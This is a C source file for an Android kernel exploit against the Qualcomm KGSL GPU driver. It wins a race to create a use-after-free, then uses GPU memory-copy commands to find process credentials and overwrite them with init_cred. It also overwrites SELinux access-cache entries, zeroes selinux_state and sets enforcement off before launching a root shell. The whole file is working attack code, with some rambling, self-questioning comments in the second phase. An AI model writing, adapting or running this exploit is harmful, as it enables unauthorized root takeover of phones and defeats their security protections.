#include "root_shell.h"

int kgsl_fd = -1;
volatile int race_done = 0;

void die(const char *msg) {
    perror(msg);
    exit(1);
}

void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    }
    return ret;
}

void gpuobj_free(int fd, unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

unsigned int create_context(int fd) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object o = {
        .gpuaddr = ib_ga,
        .size = bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id
    };
    struct kgsl_gpu_command gc = {
        .cmdlist = (uint64_t)(uintptr_t)&o,
        .cmdsize = sizeof(o),
        .numcmds = 1,
        .context_id = ctx_id
    };
    int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

void *race_thread(void *arg) {
    (void)arg;
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

static volatile int dc_civac_works = -1;
static void sigill_handler(int sig) { dc_civac_works = 0; }
static void try_dc_civac(void *addr) {
    if (dc_civac_works == 0) return;
    void *old = signal(SIGILL, sigill_handler);
    __sync_synchronize();
    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
    asm volatile("dsb sy" : : : "memory");
    __sync_synchronize();
    signal(SIGILL, old);
    if (dc_civac_works == -1) dc_civac_works = 1;
}
void flush_cpu_cache(void *start, size_t len) {
    if (dc_civac_works != 1) return;
    char *p = (char*)((uintptr_t)start & ~63);
    char *end = (char*)((uintptr_t)start + len);
    for (; p < end; p += 64) try_dc_civac(p);
}

void gen_avc_entries(void) {
    for (int pid = 1; pid <= 500; pid++) {
        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/status", pid);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char tmp[64];
            read(fd, tmp, 64);
            close(fd);
        }
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
        fd = open(path, O_RDONLY);
        if (fd >= 0) close(fd);
    }
}

void dump_avc_page(uint64_t va, uint32_t *d, int n_slots) {
    printf("\n  AVC candidate @ 0x%llx\n", (unsigned long long)va);
    int shown = 0;
    for (int slot = 0; slot < 56 && shown < n_slots; slot++) {
        int idx = slot * 72 / 4;
        if (idx + 13 >= SCAN_DWORDS) break;
        uint32_t ssid = d[idx];
        uint32_t tsid = d[idx+1];
        uint32_t tclass = d[idx+2] & 0xFFFF;
        uint32_t allowed = d[idx+3];
        uint64_t pprev = ((uint64_t)d[idx+13] << 32) | d[idx+12];
        uint32_t pprev_hi = d[idx+13];
        if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
            tclass > 0 && tclass < 1000 && (pprev_hi >> 16) == 0xFFFF) {
            printf("  [%2d] ssid=%-5u tsid=%-5u tclass=%-3u allowed=0x%08x pprev=0x%012llx\n",
                   slot, ssid, tsid, tclass, allowed, (unsigned long long)pprev & 0xFFFFFFFFFFFFULL);
            shown++;
        }
    }
}

int main(int argc, char **argv) {
    (void)argc;
    (void)argv;
    setbuf(stdout, NULL);
    printf("[+] Integrated AVC+Cred exploit (fixed addresses)\n");
    printf("[*] init_cred: 0x%lx\n", (unsigned long)FIXED_INIT_CRED);
    printf("[*] selinux_state: 0x%lx\n", (unsigned long)FIXED_SELINUX_STATE);

    int notify_pipe[2];
    if (pipe(notify_pipe) < 0) die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    // Phase 1: Root shell via UAF cred overwrite
    printf("[*] Phase 1: Root shell UAF\n");
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    uint64_t fl = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, fl);
    void *um = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (um == MAP_FAILED) die("mmap UAF");
    munmap(um, UAF_SIZE);
    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, fl);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PH");

    printf("[*] Phase 1a: Race\n");
    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, fl);
    pthread_t thr;
    pthread_create(&thr, NULL, race_thread, NULL);
    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) {
            munmap(r, OVERLAP_SIZE);
            hit = 1;
            break;
        }
        if (e == ENODEV) {
            hit = 1;
            break;
        }
        if (i % 500000 == 0) printf("  race %d\n", i);
    }
    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) {
        printf("[-] Race failed\n");
        return 1;
    }
    printf("[+] Race won\n");

    printf("[*] Phase 1b: Free UAF and reclaim\n");
    gpuobj_free(kgsl_fd, uaf_id);
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(50000);

    printf("[*] Phase 1c: Spawn task_struct spray\n");
    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    usleep(50000);
                    pid_t me = getpid();
                    write(notify_pipe[1], &me, sizeof(me));
                    execl("/system/bin/sh", "sh", NULL);
                    _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);

    printf("[*] Phase 1d: GPU scan for cred\n");
    unsigned int ctx = create_context(kgsl_fd);
    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, fl);
    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
    uint64_t ib_ga = 0, ib_flags = 0;
    gpuobj_info(kgsl_fd, ib_id, &ib_ga, &ib_flags);
    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, fl);
    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
    uint64_t dst_ga = 0, dst_flags = 0;
    gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
    uint64_t scan_start = UAF_ADDR + 0x300000;
    uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
    uint64_t cred_pages[32];
    int cred_offs[32];
    int n_cred = 0;

    for (uint64_t va = scan_start; va < scan_end && n_cred < 1; va += 0x1000) {
        if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        uint32_t *cmd = (uint32_t *)ib_m;
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i*4, &dl, &dh);
            split64(va + i*4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(kgsl_fd, ctx, ts) < 0) break;
        __sync_synchronize();
        uint32_t *d = (uint32_t *)dst_m;
        int cred_off = -1;
        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
            int cnt = 0;
            for (int j = 0; j < 8; j++)
                if (d[i + j] == 0x000007D0) cnt++;
            if (cnt >= 4) { cred_off = i * 4; break; }
        }
        if (cred_off >= 0 && n_cred < 32) {
            printf("  [CRED] va=0x%lx off=0x%x\n", (unsigned long)va, cred_off);
            cred_pages[n_cred] = va;
            cred_offs[n_cred] = cred_off;
            n_cred++;
        }
    }
    printf("\n  Found %d cred pages\n", n_cred);

    if (n_cred > 0) {
        printf("[*] Phase 1e: Overwrite cred with init_cred\n");
        uint64_t init_cred = FIXED_INIT_CRED;
        for (int p = 0; p < n_cred && p < 32; p++) {
            uint64_t cbase = cred_pages[p] + cred_offs[p];
            uint32_t *cmd = (uint32_t *)ib_m;
            int dw = 0;
            memset(ib_m, 0, 0x10000);
            memset(dst_m, 0, 0x1000);
            cmd[dw++] = cp_type7(CP_NOP, 0);
            for (int i = 0; i < 0x100/4; i++) {
                uint32_t dl, dh, sl, sh;
                split64(dst_ga + i*4, &dl, &dh);
                split64(init_cred + i*4, &sl, &sh);
                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                cmd[dw++] = sl; cmd[dw++] = sh;
            }
            for (int i = 0; i < 0x100/4; i++) {
                uint32_t dl, dh, sl, sh;
                split64(cbase + i*4, &dl, &dh);
                split64(dst_ga + i*4, &sl, &sh);
                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                cmd[dw++] = sl; cmd[dw++] = sh;
            }
            cmd[dw++] = cp_type7(CP_NOP, 0);
            __sync_synchronize();
            unsigned int ts;
            if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
                wait_timestamp(kgsl_fd, ctx, ts);
        }
        flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
        printf("  Cred overwrite done\n");
    } else {
        printf("[-] No cred pages found\n");
    }

    // Phase 2: AVC bypass (reuse UAF but need separate setup)
    // We need to close and reopen kgsl? Actually AVC bypass will do its own UAF setup.
    // But we already have kgsl_fd open; we can reuse it but need to free objects?
    // Simpler: close and reopen to avoid conflicts, but we'll keep fd and do AVC part now.
    // However AVC bypass expects its own UAF objects; we need to redo UAF setup.
    // We'll perform AVC bypass using a new UAF setup (similar to avc_bypass main).
    // To avoid interference, we close current fd? Not necessary, but AVC will allocate new objects.
    // But we must ensure previous objects are freed to free memory? We can just continue.
    // However avc_bypass uses its own UAF id and objects; we need to repeat the UAF sequence.
    // So we will perform UAF again in a similar way.
    printf("[*] Phase 2: AVC bypass\n");

    // AVC child pipes
    int start_pipe[2], done_pipe[2], setenforce_pipe[2];
    pipe(start_pipe); pipe(done_pipe); pipe(setenforce_pipe);
    fcntl(start_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(start_pipe[1], F_SETFD, FD_CLOEXEC);
    fcntl(done_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(done_pipe[1], F_SETFD, FD_CLOEXEC);
    fcntl(setenforce_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(setenforce_pipe[1], F_SETFD, FD_CLOEXEC);

    for (int i = 0; i < N_AVC_CHILD; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(start_pipe[1]);
            close(done_pipe[0]);
            close(setenforce_pipe[1]);
            prctl(PR_SET_NAME, "AVCCHILD");
            char sig;
            if (read(start_pipe[0], &sig, 1) != 1) _exit(0);
            close(start_pipe[0]);
            gen_avc_entries();
            write(done_pipe[1], "G", 1);
            if (read(setenforce_pipe[0], &sig, 1) != 1) _exit(0);
            close(setenforce_pipe[0]);
            int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
            if (fd >= 0) {
                write(fd, "0", 1);
                close(fd);
            }
            _exit(0);
        }
    }
    close(start_pipe[0]);
    close(done_pipe[1]);

    // Now perform UAF setup again for AVC (similar to avc_bypass main)
    // We already have kgsl_fd open; we can reuse but need to allocate new objects.
    // However we must free previous UAF objects? We already freed uaf_id, but ib_id/dst_id remain.
    // To avoid clutter, we can just allocate new ones and let old ones be freed at exit.
    // But for AVC we need to create new UAF object with same size and flags.
    // We'll reuse the same variables but careful not to conflict.
    printf("[*] Phase 2a: AVC UAF setup\n");
    int avc_uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, fl);
    void *avc_um = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)avc_uaf_id << 12);
    if (avc_um == MAP_FAILED) die("mmap UAF AVC");
    munmap(avc_um, UAF_SIZE);
    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS AVC");
    int avc_ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, fl);
    void *avc_ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)avc_ph_id << 12);
    if (avc_ph_m == MAP_FAILED) die("mmap PH AVC");

    printf("[*] Phase 2b: AVC Race\n");
    int avc_ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, fl);
    pthread_t avc_thr;
    pthread_create(&avc_thr, NULL, race_thread, NULL);
    int avc_hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)avc_ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) {
            munmap(r, OVERLAP_SIZE);
            avc_hit = 1;
            break;
        }
        if (e == ENODEV) {
            avc_hit = 1;
            break;
        }
        if (i % 500000 == 0) printf("  avc race %d\n", i);
    }
    race_done = 1;
    pthread_join(avc_thr, NULL);
    if (!avc_hit) {
        printf("[-] AVC race failed\n");
        return 1;
    }
    printf("[+] AVC race won\n");

    printf("[*] Phase 2c: Free UAF for AVC\n");
    gpuobj_free(kgsl_fd, avc_uaf_id);
    rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(50000);

    printf("[*] Phase 2d: Start AVC children\n");
    for (int i = 0; i < N_AVC_CHILD; i++) write(start_pipe[1], "G", 1);
    close(start_pipe[1]);

    printf("[*] Phase 2e: Wait for AVC generation\n");
    for (int i = 0; i < N_AVC_CHILD; i++) {
        char c;
        read(done_pipe[0], &c, 1);
    }
    close(done_pipe[0]);
    printf("  All AVC children done\n");

    printf("[*] Phase 2f: Signal 3 children to setenforce 0\n");
    for (int i = 0; i < 3; i++) write(setenforce_pipe[1], "S", 1);
    usleep(500000);

    printf("[*] Phase 2g: GPU scan for AVC pages\n");
    // Use existing ctx, ib_id, dst_id from Phase 1? Better allocate new ones for AVC?
    // We can reuse ctx, ib_id, dst_id but they are already used. We can allocate new.
    unsigned int avc_ctx = create_context(kgsl_fd);
    int avc_ib_id = gpuobj_alloc(kgsl_fd, 0x10000, fl);
    void *avc_ib_m = gpuobj_mmap(kgsl_fd, 0x10000, avc_ib_id);
    uint64_t avc_ib_ga = 0;
    gpuobj_info(kgsl_fd, avc_ib_id, &avc_ib_ga, NULL);
    int avc_dst_id = gpuobj_alloc(kgsl_fd, 0x4000, fl);
    void *avc_dst_m = gpuobj_mmap(kgsl_fd, 0x4000, avc_dst_id);
    uint64_t avc_dst_ga = 0;
    gpuobj_info(kgsl_fd, avc_dst_id, &avc_dst_ga, NULL);
    uint64_t avc_scan_start = UAF_ADDR + 0x300000;
    uint64_t avc_scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
    uint64_t avc_vas[512];
    int n_avc = 0;

    for (uint64_t va = avc_scan_start; va < avc_scan_end && n_avc < 512; va += 0x1000) {
        if (((va - avc_scan_start) & 0xFFFFF) == 0) printf(".");
        memset(avc_ib_m, 0, 0x10000);
        memset(avc_dst_m, 0, 0x1000);
        uint32_t *cmd = (uint32_t *)avc_ib_m;
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(avc_dst_ga + i*4, &dl, &dh);
            split64(va + i*4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, avc_ctx, avc_ib_ga, dw*4, avc_ib_id, &ts) < 0) break;
        if (wait_timestamp(kgsl_fd, avc_ctx, ts) < 0) break;
        __sync_synchronize();
        uint32_t *d = (uint32_t *)avc_dst_m;
        int ahits = 0;
        for (int ofs = 0; ofs < 4032; ofs += 72) {
            int idx = ofs / 4;
            if (idx + 13 >= SCAN_DWORDS) break;
            uint32_t ssid = d[idx];
            uint32_t tsid = d[idx+1];
            uint32_t tclass = d[idx+2] & 0xFFFF;
            uint32_t pprev_hi = d[idx + 13];
            if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
                tclass > 0 && tclass < 1000 && (pprev_hi >> 16) == 0xFFFF) ahits++;
        }
        if (ahits >= 3) {
            dump_avc_page(va, d, ahits > 20 ? 20 : ahits);
            avc_vas[n_avc] = va;
            n_avc++;
        }
    }
    printf("\n  Found %d AVC pages\n", n_avc);

    printf("[*] Phase 2h: GPU overwrite AVC allowed fields\n");
    for (int p = 0; p < n_avc; p++) {
        memset(avc_ib_m, 0, 0x10000);
        uint32_t *cmd = (uint32_t *)avc_ib_m;
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int slot = 0; slot < 4032; slot += 72) {
            uint64_t allowed_addr = avc_vas[p] + slot + 12;
            uint32_t al, ah;
            split64(allowed_addr, &al, &ah);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
            cmd[dw++] = al; cmd[dw++] = ah;
            cmd[dw++] = 0xFFFFFFFF;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, avc_ctx, avc_ib_ga, dw*4, avc_ib_id, &ts) == 0)
            wait_timestamp(kgsl_fd, avc_ctx, ts);
    }

    // Also zero selinux_state directly for extra safety
    printf("[*] Phase 2i: Directly zero selinux_state\n");
    {
        memset(avc_ib_m, 0, 0x10000);
        uint32_t *cmd = (uint32_t *)avc_ib_m;
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        int offsets[] = {0x0, 0x4, 0x8, 0xc, 0x10, 0x14, 0x18, 0x1c, 0x20};
        for (int i = 0; i < sizeof(offsets)/sizeof(int); i++) {
            uint64_t addr = FIXED_SELINUX_STATE + offsets[i];
            uint32_t al, ah;
            split64(addr, &al, &ah);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
            cmd[dw++] = al; cmd[dw++] = ah;
            cmd[dw++] = 0;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, avc_ctx, avc_ib_ga, dw*4, avc_ib_id, &ts) == 0)
            wait_timestamp(kgsl_fd, avc_ctx, ts);
        flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
    }

    printf("[*] Phase 2j: Signal remaining children to setenforce 0\n");
    for (int i = 3; i < N_AVC_CHILD; i++) write(setenforce_pipe[1], "S", 1);
    close(setenforce_pipe[1]);

    printf("[*] Phase 3: Wait for root shell\n");
    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 15000) > 0 &&
        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! uid=0 at PID %d\n", winner);
        for (int i = 0; i < n_spray; i++)
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        while (waitpid(-1, NULL, WNOHANG) > 0);
        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
        fflush(stdout);
        waitpid(winner, NULL, 0);
        printf("[-] Root shell exited\n");
        printf("＼(^o^)／\n");
    } else {
        printf("[-] No child got uid=0\n");
        printf("(TдT)\n");
    }

    close(notify_pipe[0]);
    close(setenforce_pipe[0]);
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    printf("[*] Done.\n");
    printf("(・∀・)\n");
    return 0;
}
